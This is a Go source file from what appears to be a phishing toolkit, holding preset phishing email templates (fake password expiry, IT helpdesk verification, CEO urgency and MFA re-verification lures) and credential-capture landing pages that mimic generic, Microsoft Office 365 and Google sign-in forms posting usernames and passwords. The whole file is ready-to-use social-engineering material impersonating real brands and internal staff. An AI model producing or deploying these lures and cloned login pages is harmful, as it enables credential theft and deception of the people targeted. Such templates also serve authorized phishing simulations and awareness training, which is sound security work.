package main

// emailTemplate holds a preset phishing email template.
type emailTemplate struct {
	Subject string
	HTML    string
}

var emailTemplates = map[string]emailTemplate{
	"password-reset": {
		Subject: "Action Required: Password Expiration Notice",
		HTML: `<html><body>
<p>Dear {{.FirstName}},</p>
<p>Your account password is set to expire in <b>24 hours</b>. To avoid any disruption to your access, please reset your password immediately.</p>
<p><a href="{{.URL}}" style="background-color:#0066cc;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Reset Password Now</a></p>
<p>If you did not request this change, please contact IT support.</p>
<p>Best regards,<br>IT Security Team</p>
</body></html>`,
	},
	"it-helpdesk": {
		Subject: "IT Helpdesk: Urgent Account Verification Required",
		HTML: `<html><body>
<p>Hi {{.FirstName}},</p>
<p>We have detected unusual activity on your account. As a security measure, we need you to verify your identity by logging in through our secure portal.</p>
<p><a href="{{.URL}}" style="background-color:#28a745;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Verify My Account</a></p>
<p>This verification is mandatory and must be completed within 24 hours.</p>
<p>Thank you,<br>IT Helpdesk</p>
</body></html>`,
	},
	"ceo-urgent": {
		Subject: "Urgent: Action Needed Before EOD",
		HTML: `<html><body>
<p>{{.FirstName}},</p>
<p>I need you to review and approve an important document before end of day. I am in meetings all afternoon so please handle this ASAP.</p>
<p><a href="{{.URL}}" style="background-color:#dc3545;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Review Document</a></p>
<p>Thanks,<br>CEO Office</p>
</body></html>`,
	},
	"mfa-verify": {
		Subject: "Multi-Factor Authentication: Verification Required",
		HTML: `<html><body>
<p>Dear {{.FirstName}},</p>
<p>As part of our security upgrade, all employees are required to re-verify their multi-factor authentication settings.</p>
<p><a href="{{.URL}}" style="background-color:#6f42c1;color:#fff;padding:12px 24px;text-decoration:none;border-radius:4px;display:inline-block;">Verify MFA Settings</a></p>
<p>This must be completed by end of business today to maintain access to company systems.</p>
<p>Regards,<br>Information Security</p>
</body></html>`,
	},
}

// landingPage holds a preset credential capture page.
type landingPage struct {
	HTML string
}

var landingPages = map[string]landingPage{
	"generic-login": {
		HTML: `<html><head><title>Sign In</title>
<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:360px}
h2{text-align:center;margin-bottom:24px;color:#333}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0066cc;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:16px}
</style></head><body>
<div class="card"><h2>Sign In</h2>
<form method="POST"><input name="username" placeholder="Email" type="email" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Sign In</button></form></div>
</body></html>`,
	},
	"o365-login": {
		HTML: `<html><head><title>Sign in to your account</title>
<style>body{font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f2f2f2}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:24px;font-weight:600;margin-bottom:24px}
input{width:100%;padding:10px 8px;margin:8px 0;border:none;border-bottom:1px solid #666;outline:none;font-size:15px;box-sizing:border-box}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;cursor:pointer;font-size:15px;margin-top:20px}
</style></head><body>
<div class="card"><div class="logo">Microsoft</div><p>Sign in</p>
<form method="POST"><input name="username" placeholder="Email, phone, or Skype" type="text" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Sign in</button></form></div>
</body></html>`,
	},
	"google-login": {
		HTML: `<html><head><title>Sign in - Google Accounts</title>
<style>body{font-family:"Google Sans","Roboto",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:360px}
.logo{text-align:center;font-size:24px;margin-bottom:8px}
.subtitle{text-align:center;font-size:16px;margin-bottom:32px;color:#202124}
input{width:100%;padding:13px 15px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;float:right;margin-top:32px}
</style></head><body>
<div class="card"><div class="logo">Google</div><div class="subtitle">Sign in</div>
<form method="POST"><input name="username" placeholder="Email or phone" type="text" required>
<input name="password" placeholder="Enter your password" type="password">
<button type="submit">Next</button></form></div>
</body></html>`,
	},
}
